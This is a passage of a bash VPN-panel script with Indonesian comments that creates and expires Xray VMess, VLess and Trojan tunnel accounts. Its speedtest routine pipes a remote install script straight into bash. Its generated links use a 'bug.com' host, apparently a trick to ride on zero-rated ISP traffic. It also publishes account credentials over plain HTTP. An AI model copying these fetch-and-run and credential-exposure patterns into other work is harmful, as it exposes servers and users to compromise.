        echo "ClientAliveCountMax 6" >> "$sshcfg"
    grep -q "^TCPKeepAlive" "$sshcfg" && \
        sed -i 's/^TCPKeepAlive.*/TCPKeepAlive yes/' "$sshcfg" || \
        echo "TCPKeepAlive yes" >> "$sshcfg"
    # Ubuntu 22+ pakai 'ssh', Ubuntu 20 pakai 'sshd'
    local ssh_svc; ssh_svc=$(get_ssh_service_name)
    systemctl restart "$ssh_svc" 2>/dev/null

    mkdir -p /etc/systemd/system/xray.service.d
    cat > /etc/systemd/system/xray.service.d/override.conf << 'XEOF'
[Service]
Restart=always
RestartSec=3
LimitNOFILE=65535
XEOF

    cat > /usr/local/bin/vpn-keepalive.sh << 'KAEOF'
#!/bin/bash
while true; do
    GW=$(ip route | awk '/default/{print $3; exit}')
    [[ -n "$GW" ]] && ping -c1 -W2 "$GW" >/dev/null 2>&1
    ping -c1 -W2 8.8.8.8 >/dev/null 2>&1
    sleep 25
done
KAEOF
    chmod +x /usr/local/bin/vpn-keepalive.sh

    cat > /etc/systemd/system/vpn-keepalive.service << 'KASEOF'
[Unit]
Description=VPN Keepalive
After=network.target xray.service

[Service]
Type=simple
ExecStart=/usr/local/bin/vpn-keepalive.sh
Restart=always
RestartSec=5
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
KASEOF
    systemctl daemon-reload
    systemctl enable vpn-keepalive 2>/dev/null
    systemctl restart vpn-keepalive 2>/dev/null
}

#================================================
# HAPROXY CONFIG - Support WS TLS + gRPC di 443
#================================================

configure_haproxy() {
    # HAProxy config minimal - nginx langsung handle port 443
    # HAProxy tetap enabled agar service tidak error tapi tidak bind port
    cat > /etc/haproxy/haproxy.cfg << 'HAEOF'
global
    log /dev/log local0
    maxconn 65535
    daemon

defaults
    log global
    mode tcp
    timeout connect 5s
    timeout client  1h
    timeout server  1h
    option dontlognull
HAEOF
}

#================================================
# CHANGE DOMAIN
#================================================

change_domain() {
    clear
    print_menu_header "CHANGE DOMAIN"
    echo -e "  Current: ${GREEN}${DOMAIN:-Not Set}${NC}"
    echo ""
    setup_domain
    echo -e "  ${YELLOW}Jalankan Fix Certificate [11]!${NC}"
    sleep 3
}

#================================================
# FIX CERTIFICATE
#================================================

fix_certificate() {
    clear
    print_menu_header "FIX / RENEW CERTIFICATE"
    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)
    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain belum diset!${NC}"; sleep 3; return; }
    echo -e "  Domain: ${GREEN}${DOMAIN}${NC}"
    echo ""
    # Stop service yang pakai port 80/443 dulu
    systemctl stop haproxy 2>/dev/null
    systemctl stop nginx   2>/dev/null
    sleep 1
    get_ssl_cert
    # Restart dengan validasi
    restart_service_safe "nginx" "nginx -t"
    restart_service_safe "haproxy"
    restart_service_safe "xray" "xray -test -config $XRAY_CONFIG"
    echo -e "  ${GREEN}✔ Done!${NC}"
    sleep 3
}

#================================================
# SPEEDTEST - Ookla Official CLI
#================================================

run_speedtest() {
    clear
    print_menu_header "SPEEDTEST BY OOKLA"
    echo -e "  ${YELLOW}Menyiapkan speedtest...${NC}"

    # Install Ookla speedtest CLI jika belum ada
    if ! command -v speedtest >/dev/null 2>&1; then
        echo -e "  ${CYAN}Installing Speedtest CLI (Ookla)...${NC}"
        # Install via official repo
        if curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | bash >/dev/null 2>&1; then
            apt-get install -y speedtest >/dev/null 2>&1
        fi
    fi

    # Cek ulang setelah install
    if ! command -v speedtest >/dev/null 2>&1; then
        echo -e "  ${RED}✘ Speedtest CLI tidak bisa diinstall!${NC}"
        echo -e "  ${YELLOW}Mencoba install manual...${NC}"
        local arch; arch=$(uname -m)
        local dl_url=""
        case "$arch" in
            x86_64)  dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-x86_64.tgz" ;;
            aarch64) dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-aarch64.tgz" ;;
            armv7l)  dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-armhf.tgz" ;;
            *)       echo -e "  ${RED}✘ Arsitektur tidak didukung: ${arch}${NC}"; echo ""; read -p "  Press any key to back..."; return ;;
        esac
        mkdir -p /tmp/speedtest_dl
        curl -L --max-time 60 "$dl_url" -o /tmp/speedtest_dl/speedtest.tgz 2>/dev/null
        if [[ -f /tmp/speedtest_dl/speedtest.tgz ]]; then
            tar -xzf /tmp/speedtest_dl/speedtest.tgz -C /tmp/speedtest_dl/ 2>/dev/null
            if [[ -f /tmp/speedtest_dl/speedtest ]]; then
                cp /tmp/speedtest_dl/speedtest /usr/local/bin/speedtest
                chmod +x /usr/local/bin/speedtest
                echo -e "  ${GREEN}✔ Speedtest CLI berhasil diinstall!${NC}"
            fi
        fi
        rm -rf /tmp/speedtest_dl
    fi

    if ! command -v speedtest >/dev/null 2>&1; then
        echo -e "  ${RED}✘ Speedtest tidak tersedia. Cek koneksi internet!${NC}"
        echo ""
        read -p "  Press any key to back..."
        return
    fi

    echo -e "  ${YELLOW}Testing... harap tunggu ~30 detik${NC}"
    echo ""

    local result
    result=$(speedtest --accept-license --accept-gdpr 2>/dev/null)

    if [[ -z "$result" ]]; then
        echo -e "  ${RED}✘ Speedtest gagal! Coba lagi nanti.${NC}"
        echo ""
        read -p "  Press any key to back..."
        return
    fi

    # Parse hasil speedtest Ookla
    local server latency dl ul url isp
    server=$(echo "$result"  | grep -i "Server:"   | sed 's/.*Server: //'  | head -1)
    isp=$(echo "$result"     | grep -i "ISP:"       | sed 's/.*ISP: //'     | head -1)
    latency=$(echo "$result" | grep -i "Latency:"   | awk '{print $2,$3}'   | head -1)
    dl=$(echo "$result"      | grep -i "Download:"  | awk '{print $2,$3}'   | head -1)
    ul=$(echo "$result"      | grep -i "Upload:"    | awk '{print $2,$3}'   | head -1)
    url=$(echo "$result"     | grep -i "Result URL:"| awk '{print $NF}'     | head -1)

    local W; W=$(get_width)
    local inner=$(( W - 4 ))
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC}: ${GREEN}%s${NC}\n" "ISP"        "${isp:-N/A}"
    printf "  ${WHITE}%-16s${NC}: ${GREEN}%s${NC}\n" "Server"     "${server:-N/A}"
    printf "  ${WHITE}%-16s${NC}: ${YELLOW}%s${NC}\n" "Latency"   "${latency:-N/A}"
    printf "  ${WHITE}%-16s${NC}: ${CYAN}%s${NC}\n"  "Download"   "${dl:-N/A}"
    printf "  ${WHITE}%-16s${NC}: ${CYAN}%s${NC}\n"  "Upload"     "${ul:-N/A}"
    [[ -n "$url" ]] && printf "  ${WHITE}%-16s${NC}: ${BLUE}%s${NC}\n" "Result URL" "$url"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    read -p "  Press any key to back..."
}

#================================================
# FIX XRAY PERMISSIONS
#================================================

fix_xray_permissions() {
    mkdir -p /usr/local/etc/xray /var/log/xray
    chmod 755 /usr/local/etc/xray
    chmod 755 /var/log/xray
    touch /var/log/xray/access.log /var/log/xray/error.log
    chmod 644 /var/log/xray/access.log /var/log/xray/error.log
    chmod 644 /usr/local/etc/xray/config.json 2>/dev/null
    chown -R nobody:nogroup /var/log/xray 2>/dev/null
}

#================================================
# CREATE XRAY CONFIG
# TLS:    443 (via HAProxy → 8443)
# NonTLS: 80  (via Nginx  → 8080)
# gRPC:   443 (via HAProxy → 8444, H2 detect)
#================================================

create_xray_config() {
    mkdir -p /var/log/xray /usr/local/etc/xray
    cat > "$XRAY_CONFIG" << 'XRAYEOF'
{
  "log": {
    "access": "/var/log/xray/access.log",
    "error": "/var/log/xray/error.log",
    "loglevel": "warning"
  },
  "inbounds": [
    {
      "port": 8080,
      "protocol": "vmess",
      "settings": {"clients": []},
      "streamSettings": {
        "network": "ws",
        "wsSettings": {"path": "/vmess","headers": {}}
      },
      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},
      "tag": "vmess-ws"
    },
    {
      "port": 8081,
      "protocol": "vless",
      "settings": {"clients": [],"decryption": "none"},
      "streamSettings": {
        "network": "ws",
        "wsSettings": {"path": "/vless","headers": {}}
      },
      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},
      "tag": "vless-ws"
    },
    {
      "port": 8082,
      "protocol": "trojan",
      "settings": {"clients": []},
      "streamSettings": {
        "network": "ws",
        "wsSettings": {"path": "/trojan","headers": {}}
      },
      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},
      "tag": "trojan-ws"
    },
    {
      "port": 8444,
      "protocol": "vmess",
      "settings": {"clients": []},
      "streamSettings": {
        "network": "grpc",
        "grpcSettings": {"serviceName": "vmess-grpc"}
      },
      "tag": "vmess-grpc"
    },
    {
      "port": 8445,
      "protocol": "vless",
      "settings": {"clients": [],"decryption": "none"},
      "streamSettings": {
        "network": "grpc",
        "grpcSettings": {"serviceName": "vless-grpc"}
      },
      "tag": "vless-grpc"
    },
    {
      "port": 8446,
      "protocol": "trojan",
      "settings": {"clients": []},
      "streamSettings": {
        "network": "grpc",
        "grpcSettings": {"serviceName": "trojan-grpc"}
      },
      "tag": "trojan-grpc"
    }
  ],
  "outbounds": [
    {"protocol": "freedom","settings": {"domainStrategy": "UseIPv4"},"tag": "direct"},
    {"protocol": "blackhole","settings": {},"tag": "block"}
  ],
  "routing": {
    "domainStrategy": "IPIfNonMatch",
    "rules": [{"type": "field","ip": ["geoip:private"],"outboundTag": "block"}]
  }
}
XRAYEOF
    fix_xray_permissions
}

#================================================
# INFO PORT
#================================================

show_info_port() {
    clear
    local W; W=$(get_width)
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}SERVER PORT INFORMATION${NC}"
    _box_divider $W
    _box_row $W "SSH OpenSSH"       "Port: 22"
    _box_row $W "SSH Dropbear"      "Port: 222"
    _box_row $W "Nginx TLS"         "Port: 443 (SSL direct)"
    _box_row $W "Nginx NonTLS"      "Port: 80"
    _box_row $W "Nginx Download"    "Port: 81"
    _box_row $W "Xray VMess WS"     "Port internal: 8080"
    _box_row $W "Xray VLess WS"     "Port internal: 8081"
    _box_row $W "Xray Trojan WS"    "Port internal: 8082"
    _box_row $W "Xray VMess gRPC"   "Port internal: 8444"
    _box_row $W "Xray VLess gRPC"   "Port internal: 8445"
    _box_row $W "Xray Trojan gRPC"  "Port internal: 8446"
    _box_row $W "BadVPN UDP"        "Port: 7100-7300"
    _box_row $W "ZI VPN UDP"        "Port: 7400-7500"
    _box_bottom $W
    echo ""
    read -p "  Tekan Enter untuk kembali..."
}

#================================================
# PING CHECK - CEK SEMUA PROTOCOL
#================================================

ping_check() {
    clear
    local W; W=$(get_width)
    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)
    local ip_vps; ip_vps=$(get_ip)

    _port_listening() { ss -tlnp 2>/dev/null | awk '{print $4}' | grep -qE ":${1}$"; }
    _svc_up()         { systemctl is-active --quiet "$1" 2>/dev/null; }
    _nc_local()       { nc -z -w 1 127.0.0.1 "$1" 2>/dev/null; }
    _prow() {
        local label="$1" port="$2" ok="$3"
        local W2; W2=$(get_width)
        if [ "$ok" = "0" ]; then
            printf "  %-38s ${GREEN}● ONLINE${NC}\n" "$label (port $port)"
        else
            printf "  %-38s ${RED}○ OFFLINE${NC}\n" "$label (port $port)"
        fi
    }

    _box_top $W
    _box_center $W "${YELLOW}${BOLD}PING CHECK ALL PROTOCOL${NC}"
    _box_divider $W
    _box_left $W "Domain : ${GREEN}${DOMAIN:-N/A}${NC}"
    _box_left $W "IP VPS : ${GREEN}${ip_vps}${NC}"
    _box_divider $W
    _box_center $W "${WHITE}SSH & DROPBEAR${NC}"
    _box_divider $W
    _nc_local 22  && _prow "SSH OpenSSH"  "22"  "0" || _prow "SSH OpenSSH"  "22"  "1"
    _nc_local 222 && _prow "SSH Dropbear" "222" "0" || _prow "SSH Dropbear" "222" "1"
    _box_divider $W
    _box_center $W "${WHITE}TLS PORT 443${NC}"
    _box_divider $W
    if _svc_up nginx && _port_listening 443; then
        _port_listening 8080 && _prow "VMess WS TLS"   "443" "0" || _prow "VMess WS TLS"   "443" "1"
        _port_listening 8081 && _prow "VLess WS TLS"   "443" "0" || _prow "VLess WS TLS"   "443" "1"
        _port_listening 8082 && _prow "Trojan WS TLS"  "443" "0" || _prow "Trojan WS TLS"  "443" "1"
        _port_listening 8444 && _prow "VMess gRPC TLS" "443" "0" || _prow "VMess gRPC TLS" "443" "1"
        _port_listening 8445 && _prow "VLess gRPC TLS" "443" "0" || _prow "VLess gRPC TLS" "443" "1"
        _port_listening 8446 && _prow "Trojan gRPC"    "443" "0" || _prow "Trojan gRPC"    "443" "1"
    else
        _prow "Nginx SSL"  "443" "1"
    fi
    _box_divider $W
    _box_center $W "${WHITE}NO-TLS PORT 80${NC}"
    _box_divider $W
    if _svc_up nginx && _port_listening 80; then
        _port_listening 8080 && _prow "VMess WS NonTLS"  "80" "0" || _prow "VMess WS NonTLS"  "80" "1"
        _port_listening 8081 && _prow "VLess WS NonTLS"  "80" "0" || _prow "VLess WS NonTLS"  "80" "1"
        _port_listening 8082 && _prow "Trojan WS NonTLS" "80" "0" || _prow "Trojan WS NonTLS" "80" "1"
    else
        _prow "Nginx HTTP" "80" "1"
    fi
    _box_divider $W
    _box_center $W "${WHITE}SERVICE STATUS${NC}"
    _box_divider $W
    _box_row $W "XRAY:     $( _svc_up xray      && echo '● ONLINE' || echo '○ OFFLINE')" \
               "NGINX:    $( _svc_up nginx     && echo '● ONLINE' || echo '○ OFFLINE')"
    _box_row $W "DROPBEAR: $( _svc_up dropbear  && echo '● ONLINE' || echo '○ OFFLINE')" \
               "HAPROXY:  $( _svc_up haproxy   && echo '● ONLINE' || echo '○ OFFLINE')"
    _box_row $W "SSH:      $( _svc_up ssh       && echo '● ONLINE' || echo '○ OFFLINE')" \
               "UDP CUST: $( _svc_up udp-custom && echo '● ONLINE' || echo '○ OFFLINE')"
    _box_bottom $W
    echo ""
    read -p "  Tekan Enter untuk kembali..."
}

#================================================
# CEK EXPIRED
#================================================

cek_expired() {
    clear
    print_menu_header "CEK EXPIRED ACCOUNTS"
    local today found=0
    today=$(date +%s)
    shopt -s nullglob
    for f in "$AKUN_DIR"/*.txt; do
        [[ ! -f "$f" ]] && continue
        local exp_str exp_ts uname diff
        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)
        [[ -z "$exp_str" ]] && continue
        exp_ts=$(parse_exp_ts "$exp_str")
        [[ -z "$exp_ts" ]] && continue
        uname=$(basename "$f" .txt)
        diff=$(( (exp_ts - today) / 86400 ))
        if [[ $diff -le 3 ]]; then
            found=1
            if [[ $diff -lt 0 ]]; then
                echo -e "  ${RED}✘ EXPIRED${NC}: $uname"
                echo -e "    ${YELLOW}($exp_str)${NC}"
            else
                echo -e "  ${YELLOW}⚠ ${diff} hari${NC}: $uname"
                echo -e "    ${CYAN}($exp_str)${NC}"
            fi
        fi
    done
    shopt -u nullglob
    [[ $found -eq 0 ]] && echo -e "  ${GREEN}✔ Tidak ada akun expired!${NC}"
    echo ""
    read -p "  Press any key to back..."
}

#================================================
# ROBUST DATE PARSER + DELETE EXPIRED
#================================================

# parse_exp_ts: parse tanggal format "dd Mmm, YYYY HH:MM" atau "dd Mmm YYYY"
parse_exp_ts() {
    local s="${1//,/}"   # hapus koma
    local ts
    # Coba parse langsung (date -d cukup pintar)
    ts=$(date -d "$s" +%s 2>/dev/null)
    [[ -n "$ts" ]] && echo "$ts" && return
    # Coba ganti nama bulan singkat ke angka manual
    s=$(echo "$s" | sed '
        s/Jan/01/; s/Feb/02/; s/Mar/03/; s/Apr/04/;
        s/May/05/; s/Jun/06/; s/Jul/07/; s/Aug/08/;
        s/Sep/09/; s/Oct/10/; s/Nov/11/; s/Dec/12/;
    ')
    ts=$(date -d "$s" +%s 2>/dev/null)
    [[ -n "$ts" ]] && echo "$ts" && return
    echo ""
}

delete_expired() {
    clear
    print_menu_header "DELETE EXPIRED ACCOUNTS"
    local today count=0
    today=$(date +%s)
    shopt -s nullglob
    for f in "$AKUN_DIR"/*.txt; do
        [[ ! -f "$f" ]] && continue
        local exp_str exp_ts fname uname protocol
        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)
        [[ -z "$exp_str" ]] && continue
        exp_ts=$(parse_exp_ts "$exp_str")
        [[ -z "$exp_ts" ]] && continue
        if [[ $exp_ts -lt $today ]]; then
            fname=$(basename "$f" .txt)
            protocol=${fname%%-*}
            uname=${fname#*-}
            echo -e "  ${RED}Deleting${NC}: $fname"
            local tmp; tmp=$(mktemp)
            jq --arg email "$uname"                'del(.inbounds[].settings.clients[]? | select(.email == $email))'                "$XRAY_CONFIG" > "$tmp" 2>/dev/null &&                mv "$tmp" "$XRAY_CONFIG" || rm -f "$tmp"
            [[ "$protocol" == "ssh" ]] && userdel -f "$uname" 2>/dev/null
            rm -f "$f"
            rm -f "$PUBLIC_HTML/${fname}.txt"
            rm -f "$PUBLIC_HTML/${fname}-clash.yaml"
            ((count++))
        fi
    done
    shopt -u nullglob
    if [[ $count -gt 0 ]]; then
        fix_xray_permissions
        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then
            systemctl restart xray 2>/dev/null
        else
            echo -e "  ${RED}\u2718 Xray config error setelah delete!${NC}"
        fi
        echo ""
        echo -e "  ${GREEN}\u2714 Deleted ${count} accounts!${NC}"
    else
        echo -e "  ${GREEN}\u2714 Tidak ada akun expired!${NC}"
    fi
    echo ""
    read -p "  Press any key to back..."
}

#================================================
# CREATE ACCOUNT TEMPLATE - XRAY
# TLS=443, NonTLS=80, gRPC=443
#================================================

create_account_template() {
    local protocol="$1" username="$2" days="$3" quota="$4" iplimit="$5"
    local uuid ip_vps exp created
    uuid=$(cat /proc/sys/kernel/random/uuid)
    ip_vps=$(get_ip)
    exp=$(date -d "+${days} days" +"%d %b, %Y")
    created=$(date +"%d %b, %Y")

    local temp; temp=$(mktemp)
    if [[ "$protocol" == "vmess" ]]; then
        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{"id":$uuid,"email":$email,"alterId":0}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null
    elif [[ "$protocol" == "vless" ]]; then
        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{"id":$uuid,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null
    elif [[ "$protocol" == "trojan" ]]; then
        jq --arg password "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{"password":$password,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null
    fi

    if [[ $? -eq 0 ]] && [[ -s "$temp" ]]; then
        # Validasi JSON hasil sebelum replace
        if ! jq empty "$temp" 2>/dev/null; then
            rm -f "$temp"
            echo -e "  ${RED}✘ Config xray tidak valid (JSON error)!${NC}"
            sleep 2; return 1
        fi
        mv "$temp" "$XRAY_CONFIG"
        fix_xray_permissions
        # Validasi config xray sebelum restart
        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then
            systemctl restart xray 2>/dev/null
            sleep 1
        else
            echo -e "  ${RED}✘ Xray config error setelah update!${NC}"
            xray -test -config "$XRAY_CONFIG" 2>&1 | head -5 | sed 's/^/    /'
            sleep 2; return 1
        fi
    else
        rm -f "$temp"
        echo -e "  ${RED}✘ Failed update Xray!${NC}"
        sleep 2; return 1
    fi

    mkdir -p "$AKUN_DIR"
    printf "UUID=%s\nQUOTA=%s\nIPLIMIT=%s\nEXPIRED=%s\nCREATED=%s\n" \
        "$uuid" "$quota" "$iplimit" "$exp" "$created" \
        > "$AKUN_DIR/${protocol}-${username}.txt"

    # === GENERATE LINKS ===
    # TLS=443, NonTLS=80, gRPC=443
    local link_tls link_nontls link_grpc
    if [[ "$protocol" == "vmess" ]]; then
        local j_tls j_nontls j_grpc
        j_tls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"443","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"tls"}' "$username" "$uuid" "$DOMAIN")
        link_tls="vmess://$(printf '%s' "$j_tls" | base64 -w 0)"
        j_nontls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"80","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"none"}' "$username" "$uuid" "$DOMAIN")
        link_nontls="vmess://$(printf '%s' "$j_nontls" | base64 -w 0)"
        j_grpc=$(printf '{"v":"2","ps":"%s","add":"%s","port":"443","id":"%s","aid":"0","net":"grpc","path":"vmess-grpc","type":"none","host":"bug.com","tls":"tls"}' "$username" "$DOMAIN" "$uuid")
        link_grpc="vmess://$(printf '%s' "$j_grpc" | base64 -w 0)"
    elif [[ "$protocol" == "vless" ]]; then
        link_tls="vless://${uuid}@bug.com:443?path=%2Fvless&security=tls&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"
        link_nontls="vless://${uuid}@bug.com:80?path=%2Fvless&security=none&encryption=none&host=${DOMAIN}&type=ws#${username}-NonTLS"
        link_grpc="vless://${uuid}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#${username}-gRPC"
    elif [[ "$protocol" == "trojan" ]]; then
        link_tls="trojan://${uuid}@bug.com:443?path=%2Ftrojan&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"
        link_nontls="trojan://${uuid}@bug.com:80?path=%2Ftrojan&security=none&host=${DOMAIN}&type=ws#${username}-NonTLS"
        link_grpc="trojan://${uuid}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=bug.com#${username}-gRPC"
    fi

    mkdir -p "$PUBLIC_HTML"
    cat > "$PUBLIC_HTML/${protocol}-${username}.txt" << DLEOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  YOUZIN CRABZ TUNEL - ${protocol^^} Account
  The Professor
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Username         : ${username}
 IP VPS           : ${ip_vps}
 Domain           : ${DOMAIN}
 UUID/Password    : ${uuid}
 Quota            : ${quota} GB
 IP Limit         : ${iplimit} IP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Port TLS         : 443
 Port NonTLS      : 80
 Port gRPC        : 443
 Network          : WebSocket / gRPC
 Path WS          : /${protocol}
 ServiceName gRPC : ${protocol}-grpc
 TLS              : enabled
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Link TLS         :
 ${link_tls}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Link NonTLS      :
 ${link_nontls}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Link gRPC        :
 ${link_grpc}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Download         : http://${ip_vps}:81/${protocol}-${username}.txt
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Aktif Selama     : ${days} Hari
 Dibuat Pada      : ${created}
 Berakhir Pada    : ${exp}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DLEOF

    _print_xray_result "$protocol" "$username" "$ip_vps" "$uuid" "$quota" "$iplimit" \
        "$link_tls" "$link_nontls" "$link_grpc" "$days" "$created" "$exp"

    local dl_link="http://${ip_vps}:81/${protocol}-${username}.txt"
    send_telegram_admin \
"✅ <b>New ${protocol^^} Account - Youzin Crabz Tunel</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Username   : <code>${username}</code>
🔑 UUID       : <code>${uuid}</code>
🌐 Domain     : <code>${DOMAIN}</code>
🖥️ IP VPS     : <code>${ip_vps}</code>
📦 Protocol   : ${protocol^^}
📊 Quota      : ${quota} GB
🔒 IP Limit   : ${iplimit} IP
━━━━━━━━━━━━━━━━━━━━━━━━━
🔌 Port TLS   : 443
🔌 Port NonTLS: 80
🔌 Port gRPC  : 443
━━━━━━━━━━━━━━━━━━━━━━━━━
📅 Dibuat     : ${created}
⏳ Berakhir   : ${exp}
🔗 Download   : ${dl_link}
━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Powered by The Professor</i>"

    read -p "  Press any key to back..."
}

#================================================
# PRINT XRAY RESULT
#================================================

_print_xray_result() {
    local protocol="$1" username="$2" ip_vps="$3" uuid="$4"
    local quota="$5" iplimit="$6" link_tls="$7" link_nontls="$8"
    local link_grpc="$9" days="${10}" created="${11}" exp="${12}"
    clear
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}${protocol^^} Account${NC}"
    echo -e "  ${DIM}The Professor${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username"    "$username"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP VPS"      "$ip_vps"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain"      "$DOMAIN"
    printf "  ${WHITE}%-16s${NC} : ${CYAN}%s${NC}\n"  "UUID"        "$uuid"
    printf "  ${WHITE}%-16s${NC} : %s GB\n"            "Quota"       "$quota"
    printf "  ${WHITE}%-16s${NC} : %s IP\n"            "IP Limit"    "$iplimit"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Port TLS"    "443"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Port NonTLS" "80"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Port gRPC"   "443"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Network"     "WebSocket / gRPC"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Path WS"     "/${protocol}"
    printf "  ${WHITE}%-16s${NC} : %s\n" "ServiceName" "${protocol}-grpc"
    printf "  ${WHITE}%-16s${NC} : %s\n" "TLS"         "enabled"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${YELLOW}%-16s${NC} :\n" "Link TLS";   echo "  $link_tls"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${YELLOW}%-16s${NC} :\n" "Link NonTLS"; echo "  $link_nontls"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${YELLOW}%-16s${NC} :\n" "Link gRPC";   echo "  $link_grpc"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : http://%s:81/%s-%s.txt\n" "Download" "$ip_vps" "$protocol" "$username"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : ${YELLOW}%s Hari${NC}\n" "Aktif Selama" "$days"
    printf "  ${WHITE}%-16s${NC} : %s\n"  "Dibuat"    "$created"
    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n" "Berakhir"  "$exp"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

#================================================
# TRIAL XRAY - TLS=443, NonTLS=80, gRPC=443
#================================================

create_trial_xray() {
    local protocol="$1"
    local username="trial-$(date +%H%M%S)"
    local uuid ip_vps exp created
    uuid=$(cat /proc/sys/kernel/random/uuid)
    ip_vps=$(get_ip)
    exp=$(date -d "+1 hour" +"%d %b, %Y %H:%M")
    created=$(date +"%d %b, %Y %H:%M")

    local temp; temp=$(mktemp)
    if [[ "$protocol" == "vmess" ]]; then
        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{"id":$uuid,"email":$email,"alterId":0}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null
    elif [[ "$protocol" == "vless" ]]; then
        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{"id":$uuid,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null
    elif [[ "$protocol" == "trojan" ]]; then
        jq --arg password "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{"password":$password,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null
    fi

